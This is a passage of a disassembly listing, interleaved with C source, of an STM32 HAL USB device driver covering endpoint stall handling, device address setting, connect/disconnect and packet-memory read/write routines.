 8007fc0:	801a      	strh	r2, [r3, #0]
 8007fc2:	e04b      	b.n	800805c <USB_EPStartXfer+0x16e2>
 8007fc4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007fc8:	085b      	lsrs	r3, r3, #1
 8007fca:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8007fce:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007fd2:	f003 0301 	and.w	r3, r3, #1
 8007fd6:	2b00      	cmp	r3, #0
 8007fd8:	d004      	beq.n	8007fe4 <USB_EPStartXfer+0x166a>
 8007fda:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8007fde:	3301      	adds	r3, #1
 8007fe0:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8007fe4:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8007fe8:	881b      	ldrh	r3, [r3, #0]
 8007fea:	b29a      	uxth	r2, r3
 8007fec:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8007ff0:	b29b      	uxth	r3, r3
 8007ff2:	029b      	lsls	r3, r3, #10
 8007ff4:	b29b      	uxth	r3, r3
 8007ff6:	4313      	orrs	r3, r2
 8007ff8:	b29a      	uxth	r2, r3
 8007ffa:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8007ffe:	801a      	strh	r2, [r3, #0]
 8008000:	e02c      	b.n	800805c <USB_EPStartXfer+0x16e2>
 8008002:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008006:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800800a:	681b      	ldr	r3, [r3, #0]
 800800c:	785b      	ldrb	r3, [r3, #1]
 800800e:	2b01      	cmp	r3, #1
 8008010:	d124      	bne.n	800805c <USB_EPStartXfer+0x16e2>
 8008012:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008016:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800801a:	681b      	ldr	r3, [r3, #0]
 800801c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8008020:	b29b      	uxth	r3, r3
 8008022:	461a      	mov	r2, r3
 8008024:	f8d7 30c4 	ldr.w	r3, [r7, #196]	; 0xc4
 8008028:	4413      	add	r3, r2
 800802a:	f8c7 30c4 	str.w	r3, [r7, #196]	; 0xc4
 800802e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008032:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008036:	681b      	ldr	r3, [r3, #0]
 8008038:	781b      	ldrb	r3, [r3, #0]
 800803a:	00da      	lsls	r2, r3, #3
 800803c:	f8d7 30c4 	ldr.w	r3, [r7, #196]	; 0xc4
 8008040:	4413      	add	r3, r2
 8008042:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8008046:	f8c7 30c0 	str.w	r3, [r7, #192]	; 0xc0
 800804a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800804e:	b29a      	uxth	r2, r3
 8008050:	f8d7 30c0 	ldr.w	r3, [r7, #192]	; 0xc0
 8008054:	801a      	strh	r2, [r3, #0]
 8008056:	e001      	b.n	800805c <USB_EPStartXfer+0x16e2>
      }
      else
      {
        return HAL_ERROR;
 8008058:	2301      	movs	r3, #1
 800805a:	e03a      	b.n	80080d2 <USB_EPStartXfer+0x1758>
      }
    }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

    PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 800805c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008060:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008064:	681a      	ldr	r2, [r3, #0]
 8008066:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800806a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800806e:	681b      	ldr	r3, [r3, #0]
 8008070:	781b      	ldrb	r3, [r3, #0]
 8008072:	009b      	lsls	r3, r3, #2
 8008074:	4413      	add	r3, r2
 8008076:	881b      	ldrh	r3, [r3, #0]
 8008078:	b29b      	uxth	r3, r3
 800807a:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800807e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8008082:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 8008086:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 800808a:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 800808e:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 8008092:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 8008096:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 800809a:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 800809e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80080a2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80080a6:	681a      	ldr	r2, [r3, #0]
 80080a8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80080ac:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80080b0:	681b      	ldr	r3, [r3, #0]
 80080b2:	781b      	ldrb	r3, [r3, #0]
 80080b4:	009b      	lsls	r3, r3, #2
 80080b6:	441a      	add	r2, r3
 80080b8:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 80080bc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80080c0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80080c4:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80080c8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80080cc:	b29b      	uxth	r3, r3
 80080ce:	8013      	strh	r3, [r2, #0]
  }

  return HAL_OK;
 80080d0:	2300      	movs	r3, #0
}
 80080d2:	4618      	mov	r0, r3
 80080d4:	f507 7784 	add.w	r7, r7, #264	; 0x108
 80080d8:	46bd      	mov	sp, r7
 80080da:	bd80      	pop	{r7, pc}

080080dc <USB_EPSetStall>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPSetStall(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 80080dc:	b480      	push	{r7}
 80080de:	b085      	sub	sp, #20
 80080e0:	af00      	add	r7, sp, #0
 80080e2:	6078      	str	r0, [r7, #4]
 80080e4:	6039      	str	r1, [r7, #0]
  if (ep->is_in != 0U)
 80080e6:	683b      	ldr	r3, [r7, #0]
 80080e8:	785b      	ldrb	r3, [r3, #1]
 80080ea:	2b00      	cmp	r3, #0
 80080ec:	d020      	beq.n	8008130 <USB_EPSetStall+0x54>
  {
    PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_STALL);
 80080ee:	687a      	ldr	r2, [r7, #4]
 80080f0:	683b      	ldr	r3, [r7, #0]
 80080f2:	781b      	ldrb	r3, [r3, #0]
 80080f4:	009b      	lsls	r3, r3, #2
 80080f6:	4413      	add	r3, r2
 80080f8:	881b      	ldrh	r3, [r3, #0]
 80080fa:	b29b      	uxth	r3, r3
 80080fc:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8008100:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8008104:	81bb      	strh	r3, [r7, #12]
 8008106:	89bb      	ldrh	r3, [r7, #12]
 8008108:	f083 0310 	eor.w	r3, r3, #16
 800810c:	81bb      	strh	r3, [r7, #12]
 800810e:	687a      	ldr	r2, [r7, #4]
 8008110:	683b      	ldr	r3, [r7, #0]
 8008112:	781b      	ldrb	r3, [r3, #0]
 8008114:	009b      	lsls	r3, r3, #2
 8008116:	441a      	add	r2, r3
 8008118:	89bb      	ldrh	r3, [r7, #12]
 800811a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800811e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008122:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008126:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800812a:	b29b      	uxth	r3, r3
 800812c:	8013      	strh	r3, [r2, #0]
 800812e:	e01f      	b.n	8008170 <USB_EPSetStall+0x94>
  }
  else
  {
    PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_STALL);
 8008130:	687a      	ldr	r2, [r7, #4]
 8008132:	683b      	ldr	r3, [r7, #0]
 8008134:	781b      	ldrb	r3, [r3, #0]
 8008136:	009b      	lsls	r3, r3, #2
 8008138:	4413      	add	r3, r2
 800813a:	881b      	ldrh	r3, [r3, #0]
 800813c:	b29b      	uxth	r3, r3
 800813e:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8008142:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8008146:	81fb      	strh	r3, [r7, #14]
 8008148:	89fb      	ldrh	r3, [r7, #14]
 800814a:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 800814e:	81fb      	strh	r3, [r7, #14]
 8008150:	687a      	ldr	r2, [r7, #4]
 8008152:	683b      	ldr	r3, [r7, #0]
 8008154:	781b      	ldrb	r3, [r3, #0]
 8008156:	009b      	lsls	r3, r3, #2
 8008158:	441a      	add	r2, r3
 800815a:	89fb      	ldrh	r3, [r7, #14]
 800815c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008160:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008164:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008168:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800816c:	b29b      	uxth	r3, r3
 800816e:	8013      	strh	r3, [r2, #0]
  }

  return HAL_OK;
 8008170:	2300      	movs	r3, #0
}
 8008172:	4618      	mov	r0, r3
 8008174:	3714      	adds	r7, #20
 8008176:	46bd      	mov	sp, r7
 8008178:	f85d 7b04 	ldr.w	r7, [sp], #4
 800817c:	4770      	bx	lr

0800817e <USB_EPClearStall>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPClearStall(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 800817e:	b480      	push	{r7}
 8008180:	b087      	sub	sp, #28
 8008182:	af00      	add	r7, sp, #0
 8008184:	6078      	str	r0, [r7, #4]
 8008186:	6039      	str	r1, [r7, #0]
  if (ep->doublebuffer == 0U)
 8008188:	683b      	ldr	r3, [r7, #0]
 800818a:	7b1b      	ldrb	r3, [r3, #12]
 800818c:	2b00      	cmp	r3, #0
 800818e:	f040 809d 	bne.w	80082cc <USB_EPClearStall+0x14e>
  {
    if (ep->is_in != 0U)
 8008192:	683b      	ldr	r3, [r7, #0]
 8008194:	785b      	ldrb	r3, [r3, #1]
 8008196:	2b00      	cmp	r3, #0
 8008198:	d04c      	beq.n	8008234 <USB_EPClearStall+0xb6>
    {
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 800819a:	687a      	ldr	r2, [r7, #4]
 800819c:	683b      	ldr	r3, [r7, #0]
 800819e:	781b      	ldrb	r3, [r3, #0]
 80081a0:	009b      	lsls	r3, r3, #2
 80081a2:	4413      	add	r3, r2
 80081a4:	881b      	ldrh	r3, [r3, #0]
 80081a6:	823b      	strh	r3, [r7, #16]
 80081a8:	8a3b      	ldrh	r3, [r7, #16]
 80081aa:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80081ae:	2b00      	cmp	r3, #0
 80081b0:	d01b      	beq.n	80081ea <USB_EPClearStall+0x6c>
 80081b2:	687a      	ldr	r2, [r7, #4]
 80081b4:	683b      	ldr	r3, [r7, #0]
 80081b6:	781b      	ldrb	r3, [r3, #0]
 80081b8:	009b      	lsls	r3, r3, #2
 80081ba:	4413      	add	r3, r2
 80081bc:	881b      	ldrh	r3, [r3, #0]
 80081be:	b29b      	uxth	r3, r3
 80081c0:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80081c4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80081c8:	81fb      	strh	r3, [r7, #14]
 80081ca:	687a      	ldr	r2, [r7, #4]
 80081cc:	683b      	ldr	r3, [r7, #0]
 80081ce:	781b      	ldrb	r3, [r3, #0]
 80081d0:	009b      	lsls	r3, r3, #2
 80081d2:	441a      	add	r2, r3
 80081d4:	89fb      	ldrh	r3, [r7, #14]
 80081d6:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80081da:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80081de:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80081e2:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80081e6:	b29b      	uxth	r3, r3
 80081e8:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 80081ea:	683b      	ldr	r3, [r7, #0]
 80081ec:	78db      	ldrb	r3, [r3, #3]
 80081ee:	2b01      	cmp	r3, #1
 80081f0:	d06c      	beq.n	80082cc <USB_EPClearStall+0x14e>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 80081f2:	687a      	ldr	r2, [r7, #4]
 80081f4:	683b      	ldr	r3, [r7, #0]
 80081f6:	781b      	ldrb	r3, [r3, #0]
 80081f8:	009b      	lsls	r3, r3, #2
 80081fa:	4413      	add	r3, r2
 80081fc:	881b      	ldrh	r3, [r3, #0]
 80081fe:	b29b      	uxth	r3, r3
 8008200:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8008204:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8008208:	81bb      	strh	r3, [r7, #12]
 800820a:	89bb      	ldrh	r3, [r7, #12]
 800820c:	f083 0320 	eor.w	r3, r3, #32
 8008210:	81bb      	strh	r3, [r7, #12]
 8008212:	687a      	ldr	r2, [r7, #4]
 8008214:	683b      	ldr	r3, [r7, #0]
 8008216:	781b      	ldrb	r3, [r3, #0]
 8008218:	009b      	lsls	r3, r3, #2
 800821a:	441a      	add	r2, r3
 800821c:	89bb      	ldrh	r3, [r7, #12]
 800821e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008222:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008226:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800822a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800822e:	b29b      	uxth	r3, r3
 8008230:	8013      	strh	r3, [r2, #0]
 8008232:	e04b      	b.n	80082cc <USB_EPClearStall+0x14e>
      }
    }
    else
    {
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8008234:	687a      	ldr	r2, [r7, #4]
 8008236:	683b      	ldr	r3, [r7, #0]
 8008238:	781b      	ldrb	r3, [r3, #0]
 800823a:	009b      	lsls	r3, r3, #2
 800823c:	4413      	add	r3, r2
 800823e:	881b      	ldrh	r3, [r3, #0]
 8008240:	82fb      	strh	r3, [r7, #22]
 8008242:	8afb      	ldrh	r3, [r7, #22]
 8008244:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8008248:	2b00      	cmp	r3, #0
 800824a:	d01b      	beq.n	8008284 <USB_EPClearStall+0x106>
 800824c:	687a      	ldr	r2, [r7, #4]
 800824e:	683b      	ldr	r3, [r7, #0]
 8008250:	781b      	ldrb	r3, [r3, #0]
 8008252:	009b      	lsls	r3, r3, #2
 8008254:	4413      	add	r3, r2
 8008256:	881b      	ldrh	r3, [r3, #0]
 8008258:	b29b      	uxth	r3, r3
 800825a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800825e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8008262:	82bb      	strh	r3, [r7, #20]
 8008264:	687a      	ldr	r2, [r7, #4]
 8008266:	683b      	ldr	r3, [r7, #0]
 8008268:	781b      	ldrb	r3, [r3, #0]
 800826a:	009b      	lsls	r3, r3, #2
 800826c:	441a      	add	r2, r3
 800826e:	8abb      	ldrh	r3, [r7, #20]
 8008270:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008274:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008278:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800827c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8008280:	b29b      	uxth	r3, r3
 8008282:	8013      	strh	r3, [r2, #0]

      /* Configure VALID status for the Endpoint */
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 8008284:	687a      	ldr	r2, [r7, #4]
 8008286:	683b      	ldr	r3, [r7, #0]
 8008288:	781b      	ldrb	r3, [r3, #0]
 800828a:	009b      	lsls	r3, r3, #2
 800828c:	4413      	add	r3, r2
 800828e:	881b      	ldrh	r3, [r3, #0]
 8008290:	b29b      	uxth	r3, r3
 8008292:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8008296:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800829a:	827b      	strh	r3, [r7, #18]
 800829c:	8a7b      	ldrh	r3, [r7, #18]
 800829e:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 80082a2:	827b      	strh	r3, [r7, #18]
 80082a4:	8a7b      	ldrh	r3, [r7, #18]
 80082a6:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 80082aa:	827b      	strh	r3, [r7, #18]
 80082ac:	687a      	ldr	r2, [r7, #4]
 80082ae:	683b      	ldr	r3, [r7, #0]
 80082b0:	781b      	ldrb	r3, [r3, #0]
 80082b2:	009b      	lsls	r3, r3, #2
 80082b4:	441a      	add	r2, r3
 80082b6:	8a7b      	ldrh	r3, [r7, #18]
 80082b8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80082bc:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80082c0:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80082c4:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80082c8:	b29b      	uxth	r3, r3
 80082ca:	8013      	strh	r3, [r2, #0]
    }
  }

  return HAL_OK;
 80082cc:	2300      	movs	r3, #0
}
 80082ce:	4618      	mov	r0, r3
 80082d0:	371c      	adds	r7, #28
 80082d2:	46bd      	mov	sp, r7
 80082d4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80082d8:	4770      	bx	lr

080082da <USB_SetDevAddress>:
  * @param  address new device address to be assigned
  *          This parameter can be a value from 0 to 255
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_SetDevAddress(USB_TypeDef *USBx, uint8_t address)
{
 80082da:	b480      	push	{r7}
 80082dc:	b083      	sub	sp, #12
 80082de:	af00      	add	r7, sp, #0
 80082e0:	6078      	str	r0, [r7, #4]
 80082e2:	460b      	mov	r3, r1
 80082e4:	70fb      	strb	r3, [r7, #3]
  if (address == 0U)
 80082e6:	78fb      	ldrb	r3, [r7, #3]
 80082e8:	2b00      	cmp	r3, #0
 80082ea:	d103      	bne.n	80082f4 <USB_SetDevAddress+0x1a>
  {
    /* set device address and enable function */
    USBx->DADDR = (uint16_t)USB_DADDR_EF;
 80082ec:	687b      	ldr	r3, [r7, #4]
 80082ee:	2280      	movs	r2, #128	; 0x80
 80082f0:	f8a3 204c 	strh.w	r2, [r3, #76]	; 0x4c
  }

  return HAL_OK;
 80082f4:	2300      	movs	r3, #0
}
 80082f6:	4618      	mov	r0, r3
 80082f8:	370c      	adds	r7, #12
 80082fa:	46bd      	mov	sp, r7
 80082fc:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008300:	4770      	bx	lr

08008302 <USB_DevConnect>:
  * @brief  USB_DevConnect Connect the USB device by enabling the pull-up/pull-down
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_DevConnect(USB_TypeDef *USBx)
{
 8008302:	b480      	push	{r7}
 8008304:	b083      	sub	sp, #12
 8008306:	af00      	add	r7, sp, #0
 8008308:	6078      	str	r0, [r7, #4]
  /* Enabling DP Pull-UP bit to Connect internal PU resistor on USB DP line */
  USBx->BCDR |= (uint16_t)USB_BCDR_DPPU;
 800830a:	687b      	ldr	r3, [r7, #4]
 800830c:	f8b3 3058 	ldrh.w	r3, [r3, #88]	; 0x58
 8008310:	b29b      	uxth	r3, r3
 8008312:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8008316:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800831a:	b29a      	uxth	r2, r3
 800831c:	687b      	ldr	r3, [r7, #4]
 800831e:	f8a3 2058 	strh.w	r2, [r3, #88]	; 0x58

  return HAL_OK;
 8008322:	2300      	movs	r3, #0
}
 8008324:	4618      	mov	r0, r3
 8008326:	370c      	adds	r7, #12
 8008328:	46bd      	mov	sp, r7
 800832a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800832e:	4770      	bx	lr

08008330 <USB_DevDisconnect>:
  * @brief  USB_DevDisconnect Disconnect the USB device by disabling the pull-up/pull-down
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_DevDisconnect(USB_TypeDef *USBx)
{
 8008330:	b480      	push	{r7}
 8008332:	b083      	sub	sp, #12
 8008334:	af00      	add	r7, sp, #0
 8008336:	6078      	str	r0, [r7, #4]
  /* Disable DP Pull-Up bit to disconnect the Internal PU resistor on USB DP line */
  USBx->BCDR &= (uint16_t)(~(USB_BCDR_DPPU));
 8008338:	687b      	ldr	r3, [r7, #4]
 800833a:	f8b3 3058 	ldrh.w	r3, [r3, #88]	; 0x58
 800833e:	b29b      	uxth	r3, r3
 8008340:	f3c3 030e 	ubfx	r3, r3, #0, #15
 8008344:	b29a      	uxth	r2, r3
 8008346:	687b      	ldr	r3, [r7, #4]
 8008348:	f8a3 2058 	strh.w	r2, [r3, #88]	; 0x58

  return HAL_OK;
 800834c:	2300      	movs	r3, #0
}
 800834e:	4618      	mov	r0, r3
 8008350:	370c      	adds	r7, #12
 8008352:	46bd      	mov	sp, r7
 8008354:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008358:	4770      	bx	lr

0800835a <USB_ReadInterrupts>:
  * @brief  USB_ReadInterrupts return the global USB interrupt status
  * @param  USBx Selected device
  * @retval USB Global Interrupt status
  */
uint32_t USB_ReadInterrupts(USB_TypeDef const *USBx)
{
 800835a:	b480      	push	{r7}
 800835c:	b085      	sub	sp, #20
 800835e:	af00      	add	r7, sp, #0
 8008360:	6078      	str	r0, [r7, #4]
  uint32_t tmpreg;

  tmpreg = USBx->ISTR;
 8008362:	687b      	ldr	r3, [r7, #4]
 8008364:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8008368:	b29b      	uxth	r3, r3
 800836a:	60fb      	str	r3, [r7, #12]
  return tmpreg;
 800836c:	68fb      	ldr	r3, [r7, #12]
}
 800836e:	4618      	mov	r0, r3
 8008370:	3714      	adds	r7, #20
 8008372:	46bd      	mov	sp, r7
 8008374:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008378:	4770      	bx	lr

0800837a <USB_EP0_OutStart>:
  * @param  USBx Selected device
  * @param  psetup pointer to setup packet
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EP0_OutStart(USB_TypeDef *USBx, uint8_t *psetup)
{
 800837a:	b480      	push	{r7}
 800837c:	b083      	sub	sp, #12
 800837e:	af00      	add	r7, sp, #0
 8008380:	6078      	str	r0, [r7, #4]
 8008382:	6039      	str	r1, [r7, #0]
  UNUSED(psetup);
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */
  return HAL_OK;
 8008384:	2300      	movs	r3, #0
}
 8008386:	4618      	mov	r0, r3
 8008388:	370c      	adds	r7, #12
 800838a:	46bd      	mov	sp, r7
 800838c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008390:	4770      	bx	lr

08008392 <USB_WritePMA>:
  * @param   wPMABufAddr address into PMA.
  * @param   wNBytes no. of bytes to be copied.
  * @retval None
  */
void USB_WritePMA(USB_TypeDef const *USBx, uint8_t *pbUsrBuf, uint16_t wPMABufAddr, uint16_t wNBytes)
{
 8008392:	b480      	push	{r7}
 8008394:	b08b      	sub	sp, #44	; 0x2c
 8008396:	af00      	add	r7, sp, #0
 8008398:	60f8      	str	r0, [r7, #12]
 800839a:	60b9      	str	r1, [r7, #8]
 800839c:	4611      	mov	r1, r2
 800839e:	461a      	mov	r2, r3
 80083a0:	460b      	mov	r3, r1
 80083a2:	80fb      	strh	r3, [r7, #6]
 80083a4:	4613      	mov	r3, r2
 80083a6:	80bb      	strh	r3, [r7, #4]
  uint32_t n = ((uint32_t)wNBytes + 1U) >> 1;
 80083a8:	88bb      	ldrh	r3, [r7, #4]
 80083aa:	3301      	adds	r3, #1
 80083ac:	085b      	lsrs	r3, r3, #1
 80083ae:	61bb      	str	r3, [r7, #24]
  uint32_t BaseAddr = (uint32_t)USBx;
 80083b0:	68fb      	ldr	r3, [r7, #12]
 80083b2:	617b      	str	r3, [r7, #20]
  uint32_t count;
  uint16_t WrVal;
  __IO uint16_t *pdwVal;
  uint8_t *pBuf = pbUsrBuf;
 80083b4:	68bb      	ldr	r3, [r7, #8]
 80083b6:	61fb      	str	r3, [r7, #28]

  pdwVal = (__IO uint16_t *)(BaseAddr + 0x400U + ((uint32_t)wPMABufAddr * PMA_ACCESS));
 80083b8:	88fa      	ldrh	r2, [r7, #6]
 80083ba:	697b      	ldr	r3, [r7, #20]
 80083bc:	4413      	add	r3, r2
 80083be:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 80083c2:	623b      	str	r3, [r7, #32]

  for (count = n; count != 0U; count--)
 80083c4:	69bb      	ldr	r3, [r7, #24]
 80083c6:	627b      	str	r3, [r7, #36]	; 0x24
 80083c8:	e01b      	b.n	8008402 <USB_WritePMA+0x70>
  {
    WrVal = pBuf[0];
 80083ca:	69fb      	ldr	r3, [r7, #28]
 80083cc:	781b      	ldrb	r3, [r3, #0]
 80083ce:	827b      	strh	r3, [r7, #18]
    WrVal |= (uint16_t)pBuf[1] << 8;
 80083d0:	69fb      	ldr	r3, [r7, #28]
 80083d2:	3301      	adds	r3, #1
 80083d4:	781b      	ldrb	r3, [r3, #0]
 80083d6:	021b      	lsls	r3, r3, #8
 80083d8:	b21a      	sxth	r2, r3
 80083da:	f9b7 3012 	ldrsh.w	r3, [r7, #18]
 80083de:	4313      	orrs	r3, r2
 80083e0:	b21b      	sxth	r3, r3
 80083e2:	827b      	strh	r3, [r7, #18]
    *pdwVal = (WrVal & 0xFFFFU);
 80083e4:	6a3b      	ldr	r3, [r7, #32]
 80083e6:	8a7a      	ldrh	r2, [r7, #18]
 80083e8:	801a      	strh	r2, [r3, #0]
    pdwVal++;
 80083ea:	6a3b      	ldr	r3, [r7, #32]
 80083ec:	3302      	adds	r3, #2
 80083ee:	623b      	str	r3, [r7, #32]

#if PMA_ACCESS > 1U
    pdwVal++;
#endif /* PMA_ACCESS */

    pBuf++;
 80083f0:	69fb      	ldr	r3, [r7, #28]
 80083f2:	3301      	adds	r3, #1
 80083f4:	61fb      	str	r3, [r7, #28]
    pBuf++;
 80083f6:	69fb      	ldr	r3, [r7, #28]
 80083f8:	3301      	adds	r3, #1
 80083fa:	61fb      	str	r3, [r7, #28]
  for (count = n; count != 0U; count--)
 80083fc:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80083fe:	3b01      	subs	r3, #1
 8008400:	627b      	str	r3, [r7, #36]	; 0x24
 8008402:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8008404:	2b00      	cmp	r3, #0
 8008406:	d1e0      	bne.n	80083ca <USB_WritePMA+0x38>
  }
}
 8008408:	bf00      	nop
 800840a:	bf00      	nop
 800840c:	372c      	adds	r7, #44	; 0x2c
 800840e:	46bd      	mov	sp, r7
 8008410:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008414:	4770      	bx	lr

08008416 <USB_ReadPMA>:
  * @param   wPMABufAddr address into PMA.
  * @param   wNBytes no. of bytes to be copied.
  * @retval None
  */
void USB_ReadPMA(USB_TypeDef const *USBx, uint8_t *pbUsrBuf, uint16_t wPMABufAddr, uint16_t wNBytes)
{
 8008416:	b480      	push	{r7}
 8008418:	b08b      	sub	sp, #44	; 0x2c
 800841a:	af00      	add	r7, sp, #0
 800841c:	60f8      	str	r0, [r7, #12]
 800841e:	60b9      	str	r1, [r7, #8]
 8008420:	4611      	mov	r1, r2
 8008422:	461a      	mov	r2, r3
 8008424:	460b      	mov	r3, r1
 8008426:	80fb      	strh	r3, [r7, #6]
 8008428:	4613      	mov	r3, r2
 800842a:	80bb      	strh	r3, [r7, #4]
  uint32_t n = (uint32_t)wNBytes >> 1;
 800842c:	88bb      	ldrh	r3, [r7, #4]
 800842e:	085b      	lsrs	r3, r3, #1
 8008430:	b29b      	uxth	r3, r3
 8008432:	61bb      	str	r3, [r7, #24]
  uint32_t BaseAddr = (uint32_t)USBx;
 8008434:	68fb      	ldr	r3, [r7, #12]
 8008436:	617b      	str	r3, [r7, #20]
  uint32_t count;
  uint32_t RdVal;
  __IO uint16_t *pdwVal;
  uint8_t *pBuf = pbUsrBuf;
 8008438:	68bb      	ldr	r3, [r7, #8]
 800843a:	61fb      	str	r3, [r7, #28]

  pdwVal = (__IO uint16_t *)(BaseAddr + 0x400U + ((uint32_t)wPMABufAddr * PMA_ACCESS));
 800843c:	88fa      	ldrh	r2, [r7, #6]
 800843e:	697b      	ldr	r3, [r7, #20]
 8008440:	4413      	add	r3, r2
 8008442:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 8008446:	623b      	str	r3, [r7, #32]

  for (count = n; count != 0U; count--)
 8008448:	69bb      	ldr	r3, [r7, #24]
 800844a:	627b      	str	r3, [r7, #36]	; 0x24
